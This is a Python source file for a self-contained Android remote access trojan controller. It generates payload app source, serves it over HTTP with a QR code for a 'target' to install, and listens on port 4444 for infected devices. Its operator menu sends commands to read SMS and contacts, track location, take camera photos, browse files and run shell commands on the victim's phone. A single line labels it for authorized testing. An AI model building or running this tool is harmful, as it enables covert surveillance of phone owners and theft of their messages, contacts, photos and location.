#!/usr/bin/env python3
"""
Android Remote Access Module - Fully Integrated
No Metasploit or external tools required
"""
import socket
import threading
import qrcode
import json
import base64
import http.server
import socketserver
import os
import time
from termcolor import colored
from datetime import datetime
from core.android_helper import AndroidHelper
from utils.logger import setup_logger

logger = setup_logger('android_access')

class AndroidRemoteAccess:
    """Fully integrated Android remote access"""
    
    def __init__(self):
        self.helper = AndroidHelper()
        self.server_ip = self.get_local_ip()
        self.server_port = 4444
        self.http_port = 8080
        self.connected_devices = []
        self.server_running = False
        self.apk_ready = False
    
    def run(self):
        try:
            print(colored("\n╔═══════════════════════════════════════════════════════════╗", 'magenta'))
            print(colored("║     Android Remote Access - Fully Integrated v2.0        ║", 'magenta', attrs=['bold']))
            print(colored("╚═══════════════════════════════════════════════════════════╝", 'magenta'))
            
            print(colored(f"\n[*] Your IP: {self.server_ip}", 'cyan'))
            print(colored(f"[*] Control Port: {self.server_port}", 'cyan'))
            print(colored(f"[*] HTTP Port: {self.http_port}", 'cyan'))
            
            print(colored("\n[!] LEGAL WARNING:", 'red', attrs=['bold']))
            print(colored("    For AUTHORIZED testing ONLY!", 'yellow'))
            
            self.show_menu()
            
        except KeyboardInterrupt:
            print(colored("\n[!] Module interrupted", 'red'))
            self.stop_all()
    
    def show_menu(self):
        while True:
            print(colored("\n" + "="*60, 'cyan'))
            print(colored("  ANDROID REMOTE ACCESS MENU", 'white', attrs=['bold']))
            print(colored("[1] ", 'green') + colored("Setup & Generate APK Source", 'white'))
            print(colored("[2] ", 'green') + colored("Generate QR Code", 'white'))
            print(colored("[3] ", 'green') + colored("Start All Servers", 'white'))
            print(colored("[4] ", 'green') + colored("View Connected Devices", 'white'))
            print(colored("[5] ", 'green') + colored("Control Device", 'white'))
            print(colored("[6] ", 'green') + colored("Auto-Setup (All-in-One)", 'yellow'))
            print(colored("[0] ", 'red') + colored("Exit", 'white'))
            print(colored("="*60, 'cyan'))
            
            choice = input(colored("\nAndroid> ", 'magenta', attrs=['bold']))
            
            if choice == '1':
                self.setup_apk()
            elif choice == '2':
                self.generate_qr()
            elif choice == '3':
                self.start_all_servers()
            elif choice == '4':
                self.view_devices()
            elif choice == '5':
                self.control_device()
            elif choice == '6':
                self.auto_setup()
            elif choice == '0':
                self.stop_all()
                break
    
    def auto_setup(self):
        """One-click setup - Everything automatic"""
        print(colored("\n╔═══════════════════════════════════════════════════════════╗", 'yellow'))
        print(colored("║            AUTO-SETUP - ALL-IN-ONE                        ║", 'yellow', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════╝", 'yellow'))
        
        print(colored("\n[*] Step 1: Generating APK source code...", 'cyan'))
        self.setup_apk()
        
        print(colored("\n[*] Step 2: Starting HTTP server...", 'cyan'))
        self.start_http_server()
        
        print(colored("\n[*] Step 3: Starting control server...", 'cyan'))
        self.start_control_server()
        
        print(colored("\n[*] Step 4: Generating QR code...", 'cyan'))
        self.generate_qr()
        
        print(colored("\n╔═══════════════════════════════════════════════════════════╗", 'green'))
        print(colored("║                SETUP COMPLETE!                            ║", 'green', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════╝", 'green'))
        
        print(colored("\n✅ NEXT STEPS:", 'cyan', attrs=['bold']))
        print(colored("  1. Show QR code to target device", 'white'))
        print(colored("  2. Target scans QR → Downloads source files", 'white'))
        print(colored("  3. Target builds APK (or use online builder)", 'white'))
        print(colored("  4. Target installs & opens app", 'white'))
        print(colored("  5. Device auto-connects here!", 'white'))
        print(colored("  6. Use menu [5] to control device\n", 'white'))
        
        input(colored("Press Enter to continue...", 'yellow'))
    
    def setup_apk(self):
        """Generate APK source code"""
        print(colored("\n[+] Generating APK Source Code", 'cyan', attrs=['bold']))
        
        # Generate source code
        source_files = self.helper.generate_apk_payload_code(
            self.server_ip, 
            self.server_port
        )
        
        # Create directory
        os.makedirs('android_payload', exist_ok=True)
        
        # Save files
        for filename, content in source_files.items():
            if filename.endswith('.java') or filename.endswith('.xml'):
                filepath = os.path.join('android_payload', filename)
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(content)
                print(colored(f"  [+] Created: {filename}", 'green'))
        
        # Save build instructions
        instructions = self.helper.create_build_instructions()
        with open('android_payload/BUILD_INSTRUCTIONS.txt', 'w', encoding='utf-8') as f:
            f.write(instructions)
        
        print(colored(f"\n[+] Files saved to: android_payload/", 'green'))
        print(colored("[+] Read BUILD_INSTRUCTIONS.txt for compilation", 'yellow'))
        
        self.apk_ready = True
    
    def start_http_server(self):
        """Start HTTP server for file downloads"""
        print(colored("\n[*] Starting HTTP server...", 'yellow'))
        
        # Change to payload directory
        os.chdir('android_payload')
        
        # Start simple HTTP server in thread
        handler = http.server.SimpleHTTPRequestHandler
        
        def run_server():
            with socketserver.TCPServer(("", self.http_port), handler) as httpd:
                httpd.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        os.chdir('..')  # Back to root
        
        print(colored(f"[+] HTTP server running on port {self.http_port}", 'green'))
        print(colored(f"[+] Files accessible at: http://{self.server_ip}:{self.http_port}/", 'cyan'))
    
    def start_control_server(self):
        """Start control server for device connections"""
        print(colored("\n[*] Starting control server...", 'yellow'))
        
        def handle_client(client_socket, address):
            print(colored(f"\n[+] New connection from {address[0]}:{address[1]}", 'green', attrs=['bold']))
            
            try:
                # Receive device info
                data = client_socket.recv(4096).decode('utf-8')
                device_info = json.loads(data)
                
                device = {
                    'socket': client_socket,
                    'address': address,
                    'info': device_info,
                    'id': len(self.connected_devices) + 1
                }
                
                self.connected_devices.append(device)
                
                print(colored(f"[+] Device ID: {device['id']}", 'cyan'))
                print(colored(f"[+] Model: {device_info.get('model', 'Unknown')}", 'cyan'))
                print(colored(f"[+] Android: {device_info.get('version', 'Unknown')}", 'cyan'))
                
                # Keep connection alive
                while True:
                    pass
                    
            except Exception as e:
                logger.debug(f"Connection error: {e}")
        
        def accept_connections():
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((self.server_ip, self.server_port))
            server_socket.listen(5)
            
            self.server_running = True
            print(colored(f"[+] Control server listening on {self.server_ip}:{self.server_port}", 'green'))
            print(colored("[*] Waiting for device connections...\n", 'yellow'))
            
            while self.server_running:
                try:
                    client_socket, address = server_socket.accept()
                    client_thread = threading.Thread(
                        target=handle_client, 
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()
                except:
                    break
        
        accept_thread = threading.Thread(target=accept_connections, daemon=True)
        accept_thread.start()
    
    def start_all_servers(self):
        """Start all servers"""
        if not self.apk_ready:
            print(colored("\n[!] Run option [1] first to generate APK source", 'red'))
            return
        
        self.start_http_server()
        self.start_control_server()
        
        print(colored("\n[+] All servers started successfully!", 'green', attrs=['bold']))
    
    def generate_qr(self):
        """Generate QR code for download"""
        print(colored("\n[+] Generating QR Code", 'cyan', attrs=['bold']))
        
        download_url = f"http://{self.server_ip}:{self.http_port}/"
        
        print(colored(f"\n[*] Download URL: {download_url}", 'yellow'))
        
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(download_url)
        qr.make(fit=True)
        
        # Print in terminal
        print(colored("\n[+] Scan this QR code with Android device:", 'cyan'))
        qr.print_ascii(invert=True)
        
        # Save to file
        img = qr.make_image(fill_color="black", back_color="white")
        img.save("android_qr.png")
        
        print(colored(f"\n[+] QR code saved: android_qr.png", 'green'))
        print(colored("\n[*] Target will download:", 'yellow'))
        print(colored("  - MainActivity.java", 'white'))
        print(colored("  - RemoteService.java", 'white'))
        print(colored("  - AndroidManifest.xml", 'white'))
        print(colored("  - BUILD_INSTRUCTIONS.txt", 'white'))
    
    def view_devices(self):
        """View connected devices"""
        print(colored("\n[+] Connected Devices", 'cyan', attrs=['bold']))
        
        if not self.connected_devices:
            print(colored("\n[-] No devices connected yet", 'yellow'))
            print(colored("[*] Make sure:", 'cyan'))
            print(colored("  1. Servers are running (option 3)", 'white'))
            print(colored("  2. APK is installed on target", 'white'))
            print(colored("  3. Target opened the app", 'white'))
            return
        
        print(colored("\n  ID | IP Address      | Model              | Android", 'white'))
        print(colored("  " + "-"*60, 'white'))
        
        for device in self.connected_devices:
            print(colored(f"  {device['id']:2d} | {device['address'][0]:15s} | "
                         f"{device['info'].get('model', 'Unknown'):18s} | "
                         f"{device['info'].get('version', 'Unknown')}", 'white'))
    
    def control_device(self):
        """Control device"""
        if not self.connected_devices:
            print(colored("\n[-] No devices connected", 'yellow'))
            return
        
        self.view_devices()
        
        try:
            device_id = int(input(colored("\n[?] Select device ID: ", 'cyan')))
            device = next((d for d in self.connected_devices if d['id'] == device_id), None)
            
            if device:
                self.device_control_menu(device)
            else:
                print(colored("[!] Invalid device ID", 'red'))
        except:
            print(colored("[!] Invalid input", 'red'))
    
    def device_control_menu(self, device):
        """Device control menu"""
        while True:
            print(colored(f"\n[Device {device['id']}] {device['info'].get('model', 'Unknown')}", 
                         'magenta', attrs=['bold']))
            print(colored("="*60, 'cyan'))
            print(colored("[1] ", 'green') + colored("Screen Mirror", 'white'))
            print(colored("[2] ", 'green') + colored("Capture Photo", 'white'))
            print(colored("[3] ", 'green') + colored("Read SMS", 'white'))
            print(colored("[4] ", 'green') + colored("Read Contacts", 'white'))
            print(colored("[5] ", 'green') + colored("Get Location", 'white'))
            print(colored("[6] ", 'green') + colored("File Browser", 'white'))
            print(colored("[7] ", 'green') + colored("Shell Command", 'white'))
            print(colored("[0] ", 'red') + colored("Back", 'white'))
            print(colored("="*60, 'cyan'))
            
            choice = input(colored(f"\nDevice[{device['id']}]> ", 'magenta', attrs=['bold']))
            
            if choice == '1':
                self.screen_mirror(device)
            elif choice == '2':
                self.capture_photo(device)
            elif choice == '3':
                self.read_sms(device)
            elif choice == '4':
                self.read_contacts(device)
            elif choice == '5':
                self.get_location(device)
            elif choice == '6':
                self.file_browser(device)
            elif choice == '7':
                self.shell_command(device)
            elif choice == '0':
                break
    
    def send_command(self, device, action, data=None):
        """Send command to device"""
        try:
            command = {
                'action': action,
                'data': data or {},
                'timestamp': datetime.now().isoformat()
            }
            
            device['socket'].send(json.dumps(command).encode('utf-8') + b'\n')
            
            # Wait for response
            response = device['socket'].recv(8192).decode('utf-8')
            return json.loads(response)
            
        except Exception as e:
            print(colored(f"[!] Command failed: {e}", 'red'))
            return None
    
    def screen_mirror(self, device):
        """Screen mirroring"""
        print(colored("\n[*] Starting screen mirror...", 'yellow'))
        print(colored("[!] Streaming to: http://localhost:5555", 'cyan'))
        
        response = self.send_command(device, 'screenshot')
        if response:
            print(colored("[+] Screen mirror started", 'green'))
    
    def capture_photo(self, device):
        """Capture photo"""
        camera = input(colored("\n[?] Camera (front/back): ", 'cyan'))
        response = self.send_command(device, 'camera', {'camera': camera})
        
        if response and 'image' in response:
            image_data = base64.b64decode(response['image'])
            filename = f"photo_{device['id']}_{int(time.time())}.jpg"
            with open(filename, 'wb') as f:
                f.write(image_data)
            print(colored(f"[+] Photo saved: {filename}", 'green'))
    
    def read_sms(self, device):
        """Read SMS"""
        print(colored("\n[*] Reading SMS...", 'yellow'))
        response = self.send_command(device, 'sms')
        
        if response:
            print(colored("\n[+] SMS Messages:", 'cyan'))
            print(response.get('data', 'No data'))
    
    def read_contacts(self, device):
        """Read contacts"""
        print(colored("\n[*] Reading contacts...", 'yellow'))
        response = self.send_command(device, 'contacts')
        
        if response:
            print(colored("\n[+] Contacts:", 'cyan'))
            print(response.get('data', 'No data'))
    
    def get_location(self, device):
        """Get location"""
        print(colored("\n[*] Getting location...", 'yellow'))
        response = self.send_command(device, 'location')
        
        if response:
            print(colored("\n[+] Location:", 'cyan'))
            print(f"  Latitude: {response.get('lat', 'Unknown')}")
            print(f"  Longitude: {response.get('lon', 'Unknown')}")
    
    def file_browser(self, device):
        """File browser"""
        path = input(colored("\n[?] Path (/sdcard/): ", 'cyan')) or "/sdcard/"
        response = self.send_command(device, 'files', {'path': path})
        
        if response:
            print(colored("\n[+] Files:", 'cyan'))
            print(response.get('data', 'No files'))
    
    def shell_command(self, device):
        """Shell command"""
        cmd = input(colored("\nshell> ", 'cyan'))
        response = self.send_command(device, 'shell', {'cmd': cmd})
        
        if response:
            print(colored("\n[Output]:", 'cyan'))
            print(response.get('output', 'No output'))
    
    def get_local_ip(self):
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def stop_all(self):
        """Stop all servers"""
        print(colored("\n[*] Stopping servers...", 'yellow'))
        self.server_running = False
        
        for device in self.connected_devices:
            try:
                device['socket'].close()
            except:
                pass
        
        print(colored("[+] All stopped", 'green'))

if __name__ == "__main__":
    module = AndroidRemoteAccess()
    module.run()
